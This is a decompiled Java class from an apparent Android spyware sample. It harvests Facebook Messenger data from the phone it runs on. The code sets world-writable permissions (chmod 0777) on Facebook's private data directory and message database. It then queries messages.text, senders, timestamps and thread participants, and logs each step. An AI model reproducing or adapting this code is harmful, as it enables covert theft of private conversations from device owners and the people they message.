package com.network.android.d;

import android.content.Context;
import android.os.Handler;
import com.network.android.p;
import java.util.Map;

public final class a extends p {
    static String c = "facebook";
    protected static final Map d;
    static final String e;

    static {
        b bVar = new b();
        d = bVar;
        e = (String) bVar.get("timestamp");
    }

    public static void a(Handler handler, Context context, boolean z) {
        try {
            com.network.android.c.a.a.a("getFacebookApp GetContentIM start");
            a(handler, context, z, "facebook", "/data/data/com.facebook.katana/", "/data/data/com.facebook.katana/databases/threads_db2", "SELECT  messages.msg_id, messages.thread_id,  messages.timestamp_ms,  messages.text, messages.sender, threads.participants from messages INNER JOIN threads ON messages.thread_id=threads.thread_id", "messages.timestamp_ms", "chmod 0777 /data/data/com.facebook.katana; chmod 0777 /data/data/com.facebook.katana/databases; chmod 0777 /data/data/com.facebook.katana/databases/threads_db2; chmod 0777 /data/data/com.facebook.katana/databases/threads_db2-journal; ", e, d, 3056);
            com.network.android.c.a.a.a("getFacebookApp GetContentIM end");
        } catch (Throwable th) {
            com.network.android.c.a.a.a(c + "getFacebookApp GetContentIM exception- " + th.getMessage(), th);
        }
    }
}
